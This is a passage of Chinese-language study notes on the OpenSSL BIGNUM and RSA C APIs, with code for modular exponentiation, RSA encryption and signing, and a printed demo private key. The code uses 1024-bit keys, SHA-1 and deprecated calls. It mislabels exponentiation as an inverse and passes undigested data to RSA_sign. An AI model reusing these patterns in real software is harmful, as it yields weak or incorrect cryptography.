class="title">BN_bn2hex</span><span class="params">(<span class="type">const</span> BIGNUM *a)</span></span>;</span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">BN_bn2dec</span><span class="params">(<span class="type">const</span> BIGNUM *a)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_hex2bn</span><span class="params">(BIGNUM **a, <span class="type">const</span> <span class="type">char</span> *str)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_dec2bn</span><span class="params">(BIGNUM **a, <span class="type">const</span> <span class="type">char</span> *str)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><p>int 返回值 1 表示成功。转二进制或者十六进制的返回字符指针。</p></li><li><p><strong><code>BN_bn2bin</code> 中 <code>to</code> 字符串的长度必须是 <code> BN_num_bytes(a)</code></strong>，而且是二进制输入。</p></li><li><p>如果 <code>*a</code> 是 NULL，就会函数分配内存。</p></li><li><p>转字符串的函数会返回 NULL 结尾的字符串。</p></li><li><p>注意十六进制转 BIGNUM 是不带前缀 0x 的。</p></li></ul><h3 id="基本运算">基本运算</h3><p><code>r</code> 表示结果，部分函数需要 <code>ctx</code>。<code>BN_div</code> 中 <code>dv=a/d,rem=a%d</code>，除了最简单的加减，最后一个参数都是 <code>ctx</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_add</span><span class="params">(BIGNUM *r, <span class="type">const</span> BIGNUM *a, <span class="type">const</span> BIGNUM *b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_sub</span><span class="params">(BIGNUM *r, <span class="type">const</span> BIGNUM *a, <span class="type">const</span> BIGNUM *b)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_mul</span><span class="params">(BIGNUM *r, BIGNUM *a, BIGNUM *b, BN_CTX *ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_sqr</span><span class="params">(BIGNUM *r, BIGNUM *a, BN_CTX *ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_div</span><span class="params">(BIGNUM *dv, BIGNUM *rem, <span class="type">const</span> BIGNUM *a, <span class="type">const</span> BIGNUM *d,</span></span></span><br><span class="line"><span class="params"><span class="function">           BN_CTX *ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_mod</span><span class="params">(BIGNUM *rem, <span class="type">const</span> BIGNUM *a, <span class="type">const</span> BIGNUM *m, BN_CTX *ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_exp</span><span class="params">(BIGNUM *r, BIGNUM *a, BIGNUM *p, BN_CTX *ctx)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_gcd</span><span class="params">(BIGNUM *r, BIGNUM *a, BIGNUM *b, BN_CTX *ctx)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="function">BIGNUM *<span class="title">BN_mod_inverse</span><span class="params">(BIGNUM *r, BIGNUM *a, <span class="type">const</span> BIGNUM *n, BN_CTX *ctx)</span></span>;</span><br></pre></td></tr></table></figure><p>上面的许多运算都可以加入模运算，倒数第二个参数是模。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_mod_add</span><span class="params">(BIGNUM *ret, BIGNUM *a, BIGNUM *b, <span class="type">const</span> BIGNUM *m, BN_CTX *ctx)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="比较函数">比较函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_cmp</span><span class="params">(BIGNUM *a, BIGNUM *b)</span></span>; <span class="comment">// -1 if a &lt; b, 0 if a == b and 1 if a &gt; b</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_ucmp</span><span class="params">(BIGNUM *a, BIGNUM *b)</span></span>; <span class="comment">//比较绝对值</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_is_zero</span><span class="params">(BIGNUM *a)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_is_one</span><span class="params">(BIGNUM *a)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_is_word</span><span class="params">(BIGNUM *a, BN_ULONG w)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BN_is_odd</span><span class="params">(BIGNUM *a)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="综合运用">综合运用</h3><p>虽然 BIGNUM 内置了乘法逆元、模指数运算等函数，但是我们仍然可以自己实现一个自己的乘法逆元：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">big_mod_exp2</span><span class="params">(string a, string e, string m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BIGNUM *a1, *e1, *m1;</span><br><span class="line">    BN_CTX *ctx = <span class="built_in">BN_CTX_new</span>();</span><br><span class="line">    a1 = e1 = m1 = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">BN_dec2bn</span>(&amp;a1, a.<span class="built_in">c_str</span>());</span><br><span class="line">    <span class="built_in">BN_dec2bn</span>(&amp;e1, e.<span class="built_in">c_str</span>());</span><br><span class="line">    <span class="built_in">BN_dec2bn</span>(&amp;m1, m.<span class="built_in">c_str</span>());</span><br><span class="line"></span><br><span class="line">    BIGNUM *t = <span class="built_in">BN_new</span>();</span><br><span class="line">    BIGNUM *res = <span class="built_in">BN_new</span>();</span><br><span class="line">    <span class="built_in">BN_one</span>(res);</span><br><span class="line">    <span class="built_in">BN_mod</span>(t, a1, m1, ctx);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">BN_is_zero</span>(e1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">BN_is_bit_set</span>(e1, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">BN_mod_mul</span>(res, res, t, m1, ctx);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">BN_rshift1</span>(e1, e1);</span><br><span class="line">        <span class="built_in">BN_mod_mul</span>(t, t, t, m1, ctx);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>(<span class="built_in">BN_bn2dec</span>(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较意外的是，自己实现的似乎比内置的更加高效，可能是占用内存更多一些，内置的占用内存更少一些。</p><h2 id="RSA-加密">RSA 加密</h2><p>算法原理很简单，不赘述。</p><img src="http://cdn.blog-blockchain.xyz/202211292014112.png" alt="image-20221129201415885" style="zoom: 67%;" /><h3 id="直接使用">直接使用</h3><p>首先看生成密钥的方式，<code>RSA_new</code> 并不会生成一个直接可以用的密钥，还需要赋值。赋值的方式一种是分别对参数赋值，类似于 <code>key-&gt;n = BN_bin2bn(rsaN, n_len, NULL); key-&gt;d = BN_bin2bn(rsaD, d_len, NULL); key-&gt;e = BN_bin2bn(rsaE, e_len, NULL);</code>。另外一种就是下面的函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/bn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/rsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a[]=<span class="string">&quot;asdfg123sda/.,&quot;</span>;</span><br><span class="line">    RSA *key = <span class="built_in">RSA_new</span>();</span><br><span class="line">    key = <span class="built_in">RSA_generate_key</span>(<span class="number">1024</span>,<span class="number">0x100001</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * cipher = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">RSA_size</span>(key));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * res = (<span class="type">unsigned</span> <span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="built_in">RSA_size</span>(key));</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cipher_len = <span class="built_in">RSA_public_encrypt</span>(<span class="built_in">strlen</span>((<span class="type">char</span>*)a),a,cipher,key,RSA_PKCS1_PADDING);</span><br><span class="line">    <span class="type">int</span> plain_len =<span class="built_in">RSA_private_decrypt</span>(cipher_len,cipher,res,key,RSA_PKCS1_PADDING);</span><br><span class="line">    cout&lt;&lt;<span class="built_in">string</span>((<span class="type">char</span>*)res,plain_len)&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意字符串的长度，因为加密和解密函数的字符串是没有 NULL 结尾的，创建 string 需要指定长度。</strong></p><p>接着最常用的函数如下，具体的参数要求可以查看文档。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/rsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/engine.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">RSA * <span class="title">RSA_new</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RSA_free</span><span class="params">(RSA *rsa)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_public_encrypt</span><span class="params">(<span class="type">int</span> flen, <span class="type">unsigned</span> <span class="type">char</span> *from, <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa, <span class="type">int</span> padding)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_private_decrypt</span><span class="params">(<span class="type">int</span> flen, <span class="type">unsigned</span> <span class="type">char</span> *from, <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa, <span class="type">int</span> padding)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_private_encrypt</span><span class="params">(<span class="type">int</span> flen, <span class="type">unsigned</span> <span class="type">char</span> *from, <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa,<span class="type">int</span> padding)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_public_decrypt</span><span class="params">(<span class="type">int</span> flen, <span class="type">unsigned</span> <span class="type">char</span> *from, <span class="type">unsigned</span> <span class="type">char</span> *to, RSA *rsa,<span class="type">int</span> padding)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_sign</span><span class="params">(<span class="type">int</span> type, <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_len, <span class="type">unsigned</span> <span class="type">char</span> *sigret, <span class="type">unsigned</span> <span class="type">int</span> *siglen, RSA *rsa)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_verify</span><span class="params">(<span class="type">int</span> type, <span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">unsigned</span> <span class="type">int</span> m_len, <span class="type">unsigned</span> <span class="type">char</span> *sigbuf, <span class="type">unsigned</span> <span class="type">int</span> siglen, RSA *rsa)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_size</span><span class="params">(<span class="type">const</span> RSA *rsa)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">RSA *<span class="title">RSA_generate_key</span><span class="params">(<span class="type">int</span> num, <span class="type">unsigned</span> <span class="type">long</span> e, <span class="type">void</span> (*callback)(<span class="type">int</span>,<span class="type">int</span>,<span class="type">void</span> *), <span class="type">void</span> *cb_arg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">RSA_print_fp</span><span class="params">(FILE *fp, RSA *x, <span class="type">int</span> offset)</span></span>;</span><br></pre></td></tr></table></figure><p>值得一提的是 <code>RSA_print_fp</code> 标准输出的东西，模数，公开的 e，私密的 d，两个大素数。后面的参数估计是为了简化运算，提前算出来的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">RSA Private-Key: (1024 bit, 2 primes)</span><br><span class="line">modulus:</span><br><span class="line">    00:c6:42:9c:69:e2:ef:6d:ed:9e:c6:2d:4b:ea:43:</span><br><span class="line">    35:d9:94:14:e2:b0:e9:4e:66:24:c4:5b:df:96:23:</span><br><span class="line">    ef:5d:67:46:7c:7e:ab:ff:05:5d:17:de:3f:00:d1:</span><br><span class="line">    67:f3:6a:b0:0c:89:f2:40:b9:11:0a:7d:c6:3a:23:</span><br><span class="line">    91:82:f8:c7:75:ce:3c:8c:19:f0:3e:7e:a9:fa:07:</span><br><span class="line">    a5:87:05:81:3e:51:cc:88:9e:0a:e1:34:50:77:34:</span><br><span class="line">    bb:c1:9c:bf:75:d8:54:18:fa:db:c6:74:fc:a3:60:</span><br><span class="line">    cc:44:fb:60:ea:b9:f4:68:f5:d9:11:8a:82:f8:a4:</span><br><span class="line">    c6:59:9b:82:28:2c:7c:72:1b</span><br><span class="line">publicExponent: 1048577 (0x100001)</span><br><span class="line">privateExponent:</span><br><span class="line">    00:bd:2e:ab:b0:33:d0:38:db:c7:08:71:50:52:68:</span><br><span class="line">    bc:05:c5:8f:9b:c9:0a:8a:26:59:3c:df:f0:24:d3:</span><br><span class="line">    c0:ba:68:18:5c:f9:c4:28:be:54:5d:59:44:50:20:</span><br><span class="line">    3c:67:42:e7:ff:ef:79:14:04:7a:8b:47:74:64:3a:</span><br><span class="line">    b2:75:a2:c2:ad:7c:11:4c:a5:48:89:2b:86:fa:e5:</span><br><span class="line">    6e:bd:2e:04:d6:e9:34:70:ef:d2:57:f8:cf:5d:93:</span><br><span class="line">    57:ba:b2:2a:3d:fd:3a:f0:88:27:4c:e5:5b:77:b9:</span><br><span class="line">    cc:b1:a0:4e:8a:fa:f4:51:38:49:e8:24:c7:2e:a2:</span><br><span class="line">    1d:9d:08:4f:22:54:ed:ab:79</span><br><span class="line">prime1:</span><br><span class="line">    00:fa:58:0e:cc:a1:cc:bc:38:d5:99:02:7e:2e:6a:</span><br><span class="line">    d0:3a:fe:40:bd:13:ea:5e:27:7d:8b:1a:77:d5:c3:</span><br><span class="line">    e8:13:09:f9:fc:9c:b8:db:15:e8:8b:39:03:74:66:</span><br><span class="line">    ef:9a:03:e5:a5:38:af:51:b0:2d:e0:fb:90:f1:b9:</span><br><span class="line">    45:00:f5:da:6f</span><br><span class="line">prime2:</span><br><span class="line">    00:ca:bd:4f:7b:09:86:08:95:81:28:65:38:a7:fe:</span><br><span class="line">    c6:bb:d7:5c:3a:95:ca:c0:cb:6d:97:8f:aa:f6:18:</span><br><span class="line">    91:07:8e:18:c8:5d:02:30:f8:fa:7c:87:53:41:6d:</span><br><span class="line">    80:0d:3b:ae:6d:ff:3a:33:a4:e4:61:e0:6b:bd:8f:</span><br><span class="line">    d1:1e:e6:69:15</span><br><span class="line">exponent1:</span><br><span class="line">    00:d7:1b:cc:85:a7:de:88:dd:0d:3b:00:88:ab:e9:</span><br><span class="line">    cc:dd:93:d9:d7:39:97:55:fd:89:47:c5:d1:ab:98:</span><br><span class="line">    92:97:92:d1:0c:19:b9:34:e4:67:da:1a:27:8e:4a:</span><br><span class="line">    59:cc:38:ec:77:40:c5:70:ac:82:e1:20:fa:a1:23:</span><br><span class="line">    ff:70:6b:49:01</span><br><span class="line">exponent2:</span><br><span class="line">    59:50:33:aa:45:b5:a4:35:38:50:5e:e0:59:4d:de:</span><br><span class="line">    6a:1a:a7:2a:d1:91:d2:69:10:bb:13:39:e4:71:b0:</span><br><span class="line">    be:cb:bc:7c:aa:77:60:38:fc:df:63:94:86:49:ab:</span><br><span class="line">    64:59:ac:20:30:cd:59:fa:e6:8f:72:c3:27:68:24:</span><br><span class="line">    6e:9d:44:71</span><br><span class="line">coefficient:</span><br><span class="line">    00:e0:01:b8:44:3e:26:66:05:dc:ab:6d:07:cf:63:</span><br><span class="line">    0b:72:25:ce:3e:8f:d6:61:be:f4:c9:57:b1:a3:b4:</span><br><span class="line">    7d:e4:7f:20:7d:5b:25:27:aa:d6:07:8f:0e:46:3e:</span><br><span class="line">    76:ba:15:e1:67:25:1b:10:3e:7b:87:1d:28:e1:79:</span><br><span class="line">    03:de:cc:96:ab</span><br></pre></td></tr></table></figure><h3 id="从文件读取">从文件读取</h3><p>从文件读取然后创建密钥，特别是区分公钥和私钥。我们只学了两个函数，分别用于读取公钥和私钥 <code>PEM_read_RSA_PUBKEY</code>、<code>PEM_read_RSAPrivateKey</code>。这两个函数的大小写怪怪的，考试前要记一下，因为不同格式的 PEM 文件要用不同的函数读取。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">RSA *<span class="title">createRSAWithFilename</span><span class="params">(<span class="type">char</span> *filename, <span class="type">int</span> is_pub)</span> </span>&#123;</span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to open file %s \n&quot;</span>, filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    RSA *rsa = <span class="built_in">RSA_new</span>();</span><br><span class="line">    <span class="keyword">if</span> (is_pub) &#123;</span><br><span class="line">        rsa = <span class="built_in">PEM_read_RSA_PUBKEY</span>(fp, &amp;rsa, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//        rsa = PEM_read_RSAPublicKey(fp, &amp;rsa, NULL, NULL); //这是另外一种格式的 PEM 读取方式。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        rsa = <span class="built_in">PEM_read_RSAPrivateKey</span>(fp, &amp;rsa, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="keyword">return</span> rsa;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>给出完整的加解密代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">RSA_Encrypt</span><span class="params">(string plaintext, string pub_key_file)</span> </span>&#123;</span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(pub_key_file.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load public key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    RSA *key = <span class="built_in">RSA_new</span>();</span><br><span class="line">    key = <span class="built_in">PEM_read_RSA_PUBKEY</span>(f, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;generate public key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *cipher = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="built_in">RSA_size</span>(key));</span><br><span class="line">    <span class="type">int</span> cipher_len = <span class="built_in">RSA_public_encrypt</span>(plaintext.<span class="built_in">length</span>(), (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) plaintext.<span class="built_in">c_str</span>(), cipher, key, RSA_PKCS1_PADDING);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>((<span class="type">char</span> *) cipher, cipher_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">RSA_Decrypt</span><span class="params">(string ciphertext, string pub_key_file)</span> </span>&#123;</span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(pub_key_file.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load private key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    RSA *key = <span class="built_in">RSA_new</span>();</span><br><span class="line">    key = <span class="built_in">PEM_read_RSAPrivateKey</span>(f, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;generate private key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *plain = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="built_in">RSA_size</span>(key));</span><br><span class="line">    <span class="type">int</span> plain_len = <span class="built_in">RSA_private_decrypt</span>(ciphertext.<span class="built_in">length</span>(), (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) ciphertext.<span class="built_in">c_str</span>(), plain, key, RSA_PKCS1_PADDING);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>((<span class="type">char</span> *) plain, plain_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RSA-签名">RSA 签名</h2><p>我们知道私钥用于签名，公钥用于验证。我们可以使用内置的函数，更加方便，也更加实用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">sign</span><span class="params">(string data, string private_key_file)</span> </span>&#123;</span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(private_key_file.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load private key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    RSA *key = <span class="built_in">RSA_new</span>();</span><br><span class="line">    key = <span class="built_in">PEM_read_RSAPrivateKey</span>(f, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">fclose</span>(f);</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;generate private key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *sig = (<span class="type">unsigned</span> <span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="built_in">RSA_size</span>(key));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sig_len;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">RSA_sign</span>(NID_sha1, (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) data.<span class="built_in">c_str</span>(), data.<span class="built_in">length</span>(), sig, &amp;sig_len, key)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sign failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>((<span class="type">char</span> *) sig, sig_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">verify</span><span class="params">(string data, string signature, string pub_key_file)</span> </span>&#123;</span><br><span class="line">    FILE *f = <span class="built_in">fopen</span>(pub_key_file.<span class="built_in">c_str</span>(), <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;load public key failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    RSA *key = <span class="built_in">RSA_new</span>();</span><br><span class="line">    key = <span 